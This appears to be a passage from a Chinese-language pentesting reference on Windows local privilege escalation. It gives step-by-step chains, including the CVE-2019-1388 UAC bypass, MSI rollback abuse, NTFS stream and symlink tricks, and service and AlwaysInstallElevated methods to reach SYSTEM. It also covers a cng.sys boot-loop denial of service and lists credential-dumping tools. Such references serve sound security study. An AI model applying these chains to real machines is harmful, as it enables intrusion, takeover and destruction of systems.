受影响的一些系统如下：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
要利用此漏洞，需要执行以下步骤：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## 从 管理员 中等 到 高 完整性 级别 / UAC 绕过

阅读此文以了解完整性级别（Integrity Levels）：

{{#ref}}
integrity-levels.md
{{#endref}}

然后阅读此文以了解 UAC 和 UAC 绕过：

{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 从 任意文件夹 删除/移动/重命名 到 SYSTEM 提权 (EoP)

该技术在 [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) 中有描述，并且有一份利用代码 [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。

攻击基本上是滥用 Windows Installer 的 rollback 功能，在卸载过程中用恶意文件替换合法文件。为此，攻击者需要创建一个 **malicious MSI installer**，用于劫持 `C:\Config.Msi` 文件夹，Windows Installer 在卸载其他 MSI 包时会将回滚文件存储在那里，这些回滚文件随后会被修改为包含恶意负载。

该技术总结如下：

1. Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. Stage 2 – Replacing Rollback Scripts with Malicious Ones

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

主 MSI rollback 技术（上文）假设你可以删除整个文件夹（例如 `C:\Config.Msi`）。但如果你的漏洞只允许 **任意文件删除** 呢？

你可以利用 **NTFS 内部机制**：每个文件夹都有一个隐藏的备用数据流，称为：
```
C:\SomeFolder::$INDEX_ALLOCATION
```
此流存储文件夹的**索引元数据**。

因此，如果你**删除文件夹的 `::$INDEX_ALLOCATION` 流**，NTFS 会**从文件系统中移除整个文件夹**。

你可以使用标准文件删除 APIs 来执行此操作，例如：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 即使你在调用 *file* delete API，它**删除了文件夹本身**。

### 从 Folder Contents Delete 到 SYSTEM EoP
如果你的 primitive 不允许你删除任意文件/文件夹，但它**允许删除攻击者控制的文件夹的 *contents***？

1. 第 1 步：设置诱饵文件夹和文件
- 创建: `C:\temp\folder1`
- 在其中: `C:\temp\folder1\file1.txt`

2. 第 2 步：在 `file1.txt` 上放置一个 **oplock**
- 当有特权进程尝试删除 `file1.txt` 时，oplock 会**暂停执行**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 第3步：触发 SYSTEM 进程（例如 `SilentCleanup`）
- 该进程扫描文件夹（例如 `%TEMP%`）并尝试删除其内容。
- 当它到达 `file1.txt` 时，**oplock 触发** 并将控制权交给你的回调。

4. 第4步：在 oplock 回调内 – 重定向删除操作

- 选项 A：将 `file1.txt` 移到其他位置
- 这会清空 `folder1`，而不会破坏 oplock。
- 不要直接删除 `file1.txt` —— 那会过早释放 oplock。

- 选项 B：将 `folder1` 转换为 **junction**：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 选项 C：在 `\RPC Control` 中创建 **symlink**：
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 这针对存储文件夹元数据的 NTFS internal stream — 删除它会删除该文件夹。

5. 第5步：释放 oplock
- SYSTEM 进程继续并尝试删除 `file1.txt`。
- 但现在，由于 junction + symlink，它实际上正在删除：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**结果**: `C:\Config.Msi` is deleted by SYSTEM.

### 从 Arbitrary Folder Create 到 Permanent DoS

利用一个原语（primitive）可以让你 **以 SYSTEM/admin 身份 创建任意文件夹** —  即使 **你无法写入文件** 或 **设置弱权限**。

创建一个 **文件夹**（不是文件），其名称为一个 **critical Windows driver**，例如：
```
C:\Windows\System32\cng.sys
```
- 该路径通常对应 `cng.sys` 内核模式驱动。
- 如果你 **预先将其创建为文件夹**，Windows 在启动时无法加载实际驱动。
- 随后，Windows 在启动时尝试加载 `cng.sys`。
- 它看到该文件夹，**无法解析实际驱动**，并且**导致崩溃或停止启动**。
- 没有**回退机制**，且在没有外部干预（例如，启动修复或磁盘访问）的情况下**无法恢复**。

### 从特权日志/备份路径 + OM symlinks 到任意文件覆写 / 引导 DoS

当一个 **特权服务** 将日志/导出写到从 **可写配置** 读取的路径时，通过 **Object Manager symlinks + NTFS mount points** 重定向该路径，可将特权写入变成任意覆写（即使 **没有** SeCreateSymbolicLinkPrivilege）。

**Requirements**
- 存储目标路径的配置可被攻击者写入（例如，`%ProgramData%\...\.ini`）。
- 能够创建到 `\RPC Control` 的挂载点和 OM 文件 symlink（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- 一个会向该路径写入的特权操作（日志、导出、报告）。

**Example chain**
1. 读取配置以找出特权日志目标，例如在 `C:\ProgramData\ICONICS\IcoSetup64.ini` 中的 `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 在无管理员权限的情况下重定向该路径：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 等待特权组件写入日志（例如，管理员触发“发送测试短信”）。写入现在落到 `C:\Windows\System32\cng.sys`。
4. 检查被覆盖的目标（hex/PE parser）以确认损坏；重启会迫使 Windows 加载被篡改的驱动程序路径 → **导致启动循环的 DoS**。这同样可推广到任何特权服务为写入而打开的受保护文件。

> `cng.sys` 通常从 `C:\Windows\System32\drivers\cng.sys` 加载，但如果在 `C:\Windows\System32\cng.sys` 存在副本，则可能优先尝试该路径，从而使其成为损坏数据的可靠 DoS 吸收点。



## **从 High Integrity 到 SYSTEM**

### **新服务**

如果你已经在高完整性进程上运行，**通往 SYSTEM 的路径** 可能很简单，只需 **创建并执行一个新服务**：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 在创建 service binary 时，确保它是一个有效的 service，或者该 binary 能执行必要的操作并尽快完成，因为如果它不是有效的 service，将在 20s 内被终止。

### AlwaysInstallElevated

从 High Integrity 进程你可以尝试 **启用 AlwaysInstallElevated 注册表项** 并使用一个 _**.msi**_ 包装器 **安装** 一个反向 shell。\
[有关所涉注册表项以及如何安装 _.msi_ 包的更多信息请见此处。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**你可以** [**在这里找到代码**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

如果你拥有那些 token 权限（很可能会在已经是 High Integrity 的进程中找到），你将能够使用 SeDebug 权限 **打开几乎任何进程**（非受保护进程），**复制该进程的 token**，并用该 token **创建任意进程**。\
使用此技术通常会 **选择任何以 SYSTEM 运行且具有所有 token 权限的进程**（_是的，你可以找到没有所有 token 权限的 SYSTEM 进程_）。\
**你可以在这里找到一个** [**执行所述技术的示例代码**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

这个技术被 meterpreter 在 `getsystem` 中用于提权。该技术的流程是 **创建一个 pipe，然后创建/滥用一个 service 向该 pipe 写入**。随后，创建该 pipe 的 **server**（使用 **`SeImpersonate`** 权限）将能够 **模拟 pipe 客户端（即该 service）的 token**，从而获得 SYSTEM 权限。\
如果你想 [**了解更多关于 named pipes 的内容请阅读此处**](#named-pipe-client-impersonation)。\
如果你想阅读一个 [**如何使用 named pipes 从 high integrity 提权到 System 的示例**](from-high-integrity-to-system-with-name-pipes.md)，请阅读此处。

### Dll Hijacking

如果你设法 **劫持一个被以 SYSTEM 身份运行的进程加载的 dll**，你将能够以该权限执行任意代码。因此 Dll Hijacking 对这类提权也很有用，而且从 high integrity 进程实现起来**更为容易**，因为它对用于加载 dll 的文件夹具有 **write permissions**。\
**你可以** [**在此处了解更多关于 Dll hijacking 的信息**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- https://github.com/sailay1996/RpcSsImpersonator
- https://decoder.cloud/2020/05/04/from-network-service-to-system/
- https://github.com/decoder-it/NetworkServiceExploit

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**阅读：** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 更多帮助

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 有用的工具

**检测 Windows 本地提权向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 检查错误配置和敏感文件（**[**查看此处**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。已检测。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 检查一些可能的错误配置并收集信息（**[**查看此处**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc**](https://github.com/enjoiz/Privesc) **-- 检查错误配置**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- 提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 的保存会话信息。在本地使用 -Thorough。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 从 Credential Manager 提取凭证。已检测。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 在域内对收集到的密码进行密码喷射**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh 是一个基于 PowerShell 的 ADIDNS/LLMNR/mDNS 欺骗与中间人工具。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的 Windows 提权枚举**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~-- 搜索已知的提权漏洞（已弃用，改用 Watson）~~**\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 本地检查 **(需要 Admin 权限)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 搜索已知的提权漏洞（需要使用 VisualStudio 编译）（[**预编译**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 枚举主机以查找错误配置（更偏向信息收集工具而非纯提权）（需要编译）（[**预编译**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)）\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 从大量软件中提取凭证（GitHub 上有预编译 exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- 将 PowerUp 移植到 C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~-- 检查错误配置（GitHub 上有预编译可执行文件）。不推荐，Win10 表现不佳。~~**\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 检查可能的错误配置（基于 python 的 exe）。不推荐，Win10 表现不佳。

**Bat**

[**winPEASbat**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) -- 基于该文章创建的工具（不需要 accesschk 也能正常工作，但可以使用它）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- 读取 **systeminfo** 的输出并推荐可用的 exploit（本地 python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- 读取 **systeminfo** 的输出并推荐可用的 exploit（本地 python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

你必须使用正确版本的 .NET 编译该项目（[查看此处](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。要查看受害主机上已安装的 .NET 版本，你可以执行：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考资料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
